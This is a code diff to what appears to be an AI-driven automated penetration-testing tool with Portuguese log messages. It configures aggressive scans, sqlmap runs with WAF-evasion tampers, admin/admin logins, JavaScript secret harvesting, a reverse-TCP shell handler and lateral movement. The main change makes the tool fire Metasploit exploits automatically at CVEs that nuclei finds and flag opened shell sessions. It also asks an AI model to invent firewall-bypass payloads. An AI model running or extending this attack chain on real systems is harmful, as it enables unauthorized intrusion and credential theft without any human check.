@@ -1179,11 +1179,11 @@ MANDATORY CHAINING RULES:
     ffuf:         { tool: 'ffuf',      args: (t) => ({ url: `${t}/FUZZ`, extensions: 'php,asp,aspx,jsp,txt,bak,old,zip,env,conf,log,json,xml,yaml', flags: '-mc 200,201,204,301,302,307,403 -fc 404,429 -recursion -recursion-depth 2 -t 50 -timeout 10' }) },
     aquatone:     { tool: 'aquatone',  args: (t) => ({ hosts: t, flags: '-ports xlarge -timeout 3000' }) },
     burp_suite:   { tool: 'shell',     args: ()  => ({ command: 'nohup burpsuite &>/dev/null &' }) },
-    naabu_scan:   { tool: 'nmap',      args: (t) => ({ target: t.replace(/https?:\/\//, '').split('/')[0], flags: '-sV -sC --script=http-title,http-headers,http-auth-finder,http-methods,ssl-cert,banner,vuln -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,587,636,993,995,1433,1521,2375,3000,3306,3389,4000,4443,4848,5000,5432,5900,5984,6379,7001,8000,8080,8081,8443,8444,8888,9000,9090,9200,9300,10000,27017 --min-rate 3000 -Pn --open' }) },
+    naabu_scan:   { tool: 'nmap',      args: (t) => ({ target: t.replace(/https?:\/\//, '').split('/')[0], flags: '-sV -sC --script=http-title,http-headers,http-auth-finder,http-methods,ssl-cert,banner,vuln -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,587,636,993,995,1433,1521,2375,3000,3306,3389,4000,4443,4848,5000,5432,5900,5984,6379,7001,8000,8080,8081,8443,8444,8888,9000,9090,9200,9300,10000,27017 --min-rate 3000 -Pn --open', timeout: 180 }) },
     katana_crawl: { tool: 'shell',     args: (t) => ({ command: `if command -v katana &>/dev/null; then katana -u "${t}" -depth 3 -js-crawl -known-files all -no-color -silent 2>/dev/null | head -100; elif command -v gau &>/dev/null; then gau "${t.replace(/https?:\/\//, '')}" 2>/dev/null | head -60 | while read URL; do CODE=$(curl -sk -o /dev/null -w "%{http_code}" -m 5 "$URL" 2>/dev/null); echo "[$CODE] $URL"; done | head -60; else curl -sk -L -m 20 "${t}" 2>/dev/null | grep -oE '(href|src|action)="[^"]{5,100}"' | tr -d '"' | sed 's/^href=//;s/^src=//;s/^action=//' | sort -u | head -50; fi` }) },
-    nuclei_fast:  { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'cves,misconfig,exposure,vulnerabilities,default-logins,takeovers,technologies,headless,file,network', severity: 'critical,high,medium', flags: '-rl 150 -bs 30 -c 30 -no-color' }) },
-    nuclei_exploit:{ tool: 'nuclei',   args: (t) => ({ target: t, templates: 'exploits,cves,vulnerabilities', severity: 'critical,high', flags: '-rl 50 -no-color' }) },
-    sqli_scan:    { tool: 'sqlmap',    args: (t) => ({ target: t, flags: '--batch --dbs --forms --crawl=3 --level=5 --risk=3 --technique=BEUSTQ --tamper=space2comment,charencode,randomcase,between,equaltolike,greatest,modsecurityversioned --random-agent --time-sec=5 --threads=5 --smart' }) },
+    nuclei_fast:  { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'cves,misconfig,exposure,vulnerabilities,default-logins,takeovers,technologies,headless,file,network', severity: 'critical,high,medium', flags: '-rl 150 -bs 30 -c 30 -no-color', timeout: 300 }) },
+    nuclei_exploit:{ tool: 'nuclei',   args: (t) => ({ target: t, templates: 'exploits,cves,vulnerabilities', severity: 'critical,high', flags: '-rl 50 -no-color', timeout: 240 }) },
+    sqli_scan:    { tool: 'sqlmap',    args: (t) => ({ target: t, flags: '--batch --dbs --forms --crawl=2 --level=5 --risk=3 --technique=BEUSTQ --tamper=space2comment,charencode,randomcase,between,equaltolike,greatest,modsecurityversioned --random-agent --time-sec=5 --threads=5 --smart', timeout: 240 }) },
     xss_check:    { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'xss,headless', severity: 'high,medium,low', flags: '-rl 50 -no-color' }) },
     cors_check:   { tool: 'shell',     args: (t) => ({ command: `echo "=== CORS MISCONFIG TEST ===" && for ORIGIN in "https://evil.com" "https://attacker.com" "null" "http://localhost"; do RESP=$(curl -sk -I -m 10 -H "Origin: $ORIGIN" "${t}" 2>/dev/null | grep -iE "access-control"); echo "Origin=$ORIGIN -> $RESP"; done && echo "--- Null origin ---" && curl -sk -I -m 10 -H "Origin: null" "${t}" 2>/dev/null | grep -iE "access-control" && echo "--- Nuclei CORS ---" && nuclei -u "${t}" -tags cors,misconfig -severity critical,high,medium,low -no-color 2>&1 | head -25` }) },
     js_analyze:   { tool: 'shell',     args: (t) => ({ command: `echo "=== TECH FINGERPRINT ===" && whatweb -a 3 "${t}" 2>/dev/null | head -15 && echo "=== SECURITY HEADERS ===" && curl -skI -L -m 10 "${t}" 2>/dev/null | grep -iE "(server:|x-powered-by:|x-generator:|x-aspnet|cf-ray:|set-cookie:)" && echo "=== JS SECRET EXTRACTION ===" && curl -sk -L -m 20 "${t}" 2>/dev/null > /tmp/kgb_page.html && BASE=$(echo "${t}" | grep -oE "https?://[^/]+") && grep -oE 'src="[^"]+[.]js[^"]*"' /tmp/kgb_page.html | grep -oE '"[^"]*"' | tr -d '"' | grep -vE "(jquery|bootstrap|analytics|gtag|fontawesome)" | head -8 | while read JSPATH; do FULL=$(echo "$JSPATH" | grep -qE "^https?://" && echo "$JSPATH" || echo "$BASE/$JSPATH"); echo "--- $FULL ---"; curl -sk -L -m 12 "$FULL" 2>/dev/null > /tmp/kgb_js.tmp; grep -iE "apikey|api_key|secret|password|access_token|private_key|aws_access" /tmp/kgb_js.tmp | grep -oE "[A-Za-z0-9+/=_-]{15,}" | head -6; grep -oE '"/api/[^"]{3,60}"' /tmp/kgb_js.tmp | sort -u | head -8; grep -oE '"/v[12]/[^"]{3,60}"' /tmp/kgb_js.tmp | sort -u | head -5; done && echo "=== SOURCE MAPS ===" && grep -oE "assets/[a-zA-Z0-9_-]+[.]js" /tmp/kgb_page.html 2>/dev/null | head -3 | while read F; do CODE=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 "${t.replace(/\/$/, '')}/$F.map"); echo "[MAP:$CODE] $F.map"; done 2>&1 | head -80` }) },
@@ -1261,7 +1261,7 @@ else
 fi
 `.trim() }) },
     waf_bypass:     { tool: 'waf_bypass',     args: (t) => ({ target: t, mode: 'full' }) },
-    msf_exploit:    { tool: 'msf_exploit',    args: (t) => ({ target: t.replace(/https?:\/\//, '').split('/')[0], cve: 'recent', lport: '4444' }) },
+    msf_exploit:    { tool: 'msf_exploit',    args: (t, cve) => ({ target: t.replace(/https?:\/\//, '').split('/')[0], cve: cve || 'recent', lport: '4444' }) },
     payload_mutate: { tool: 'payload_mutate', args: (t) => ({ target: t + '?id=FUZZ', payload: "' OR 1=1--", type: 'sqli' }) },
     crawl_auth:     { tool: 'crawl_auth',     args: (t) => ({ target: t, username: 'admin', password: 'admin' }) },
     idor_test:      { tool: 'idor_test',      args: (t) => ({ target: t + '/api/user/1', range: '1-100' }) },
@@ -1270,7 +1270,7 @@ fi
     evasion_scan:   { tool: 'evasion_scan',   args: (t) => ({ target: t, mode: 'full' }) },
     c2_handler:     { tool: 'c2_handler',     args: ()  => ({ payload: 'linux/x86/shell/reverse_tcp', lport: '4444' }) },
     lateral_move:   { tool: 'lateral_move',   args: (t) => ({ pivot_host: t.replace(/https?:\/\//, '').split('/')[0], mode: 'enum' }) },
-    playwright_crawl:{ tool: 'playwright_crawl', args: (t) => ({ target: t, depth: 2, actions: 'all' }) },
+    playwright_crawl:{ tool: 'playwright_crawl', args: (t) => ({ target: t, depth: 2, actions: 'all', timeout: 300 }) },
     adaptive_mutate:{ tool: 'adaptive_mutate',  args: (t) => ({ target: t + '?id=INJECT', payload: "' OR 1=1--", type: 'sqli', rounds: 5 }) },
     cve_rag:        { tool: 'cve_rag',         args: (t) => ({ product: 'apache', version: 'detected', severity: 'high', limit: 10 }) },
     session_manage: { tool: 'session_manage',  args: (t) => ({ target: t + '/login', action: 'login', username: 'admin', password: 'admin' }) },
@@ -1308,7 +1308,9 @@ fi
         const args = { ...(toolKey === 'xss_inject' ? map.args(tgt, xssCallback) : map.args(tgt)), user_agent: randUA() };
         const r  = await fetch(`${mcpUrl}/call/${map.tool}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(args) });
         const rd = await r.json();
-        const out = (rd.output || rd.error || '(sem output)').slice(0, 2000);
+        const LONG_OUTPUT_TOOLS = ['nuclei_fast','nuclei_exploit','info_disclosure','playwright_crawl','js_analyze','js_bundle_analysis','sqli_scan','wpscan','cve_rag','cve_rag_local','lateral_move','post_exploit'];
+        const maxOut = LONG_OUTPUT_TOOLS.includes(toolKey) ? 5000 : 2500;
+        const out = (rd.output || rd.error || '(sem output)').slice(0, maxOut);
         results.push({ key: toolKey, out });
         setLog(prev => [...prev, { t: 'ok', m: `✓ ${toolKey}` }]);
       } catch (e) {
@@ -1511,13 +1513,22 @@ Responde em JSON: {"api_endpoints":[], "idor_candidates":[], "hardcoded_secrets"
                 } catch (_) {}
               }
             }
-            // CVE auto-match: if nuclei found exploitable CVEs, auto-add msf_exploit
+            // CVE auto-match: if nuclei found exploitable CVEs, run msf_exploit inline with real CVE
             const nucleiOut = allResults.find(r => r.key === 'nuclei_fast' || r.key === 'nuclei_exploit')?.out || '';
             const cveMatches = nucleiOut.match(/CVE-\d{4}-\d+/gi) || [];
-            if (cveMatches.length > 0 && !parsed.next_tools?.includes('msf_exploit')) {
-              const topCve = [...new Set(cveMatches)][0];
-              setLog(prev => [...prev, { t: 'ok', m: `CVE auto-match: ${topCve} → msf_exploit` }]);
-              parsed.next_tools = [...(parsed.next_tools || []), 'msf_exploit'];
+            if (cveMatches.length > 0 && !allResults.find(r => r.key === 'msf_exploit')) {
+              const topCves = [...new Set(cveMatches)].slice(0, 3);
+              setLog(prev => [...prev, { t: 'ok', m: `CVE auto-match: ${topCves.join(', ')} → msf_exploit` }]);
+              try {
+                const msfArgs = { target: target.replace(/https?:\/\//, '').split('/')[0], cve: topCves[0], lport: '4444', timeout: 120 };
+                const msfR = await fetch(`${mcpUrl}/call/msf_exploit`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(msfArgs) });
+                const msfRd = await msfR.json();
+                allResults.push({ key: 'msf_exploit', out: (msfRd.output || '').slice(0, 3000) });
+                const msfSuccess = (msfRd.output || '').match(/session.*opened|meterpreter.*opened|command.*shell.*session/i);
+                setLog(prev => [...prev, { t: msfSuccess ? 'ok' : 'info', m: msfSuccess ? `✓ msf_exploit [${topCves[0]}] — SESSÃO ABERTA!` : `✓ msf_exploit [${topCves[0]}] — sem sessão` }]);
+              } catch (e) {
+                setLog(prev => [...prev, { t: 'err', m: `✗ msf_exploit: ${e.message}` }]);
+              }
             }
             // Dynamic payload generation: if WAF blocked, ask Claude to invent custom bypasses
             const wafOut = allResults.find(r => r.key === 'waf_bypass' || r.key === 'adaptive_mutate')?.out || '';
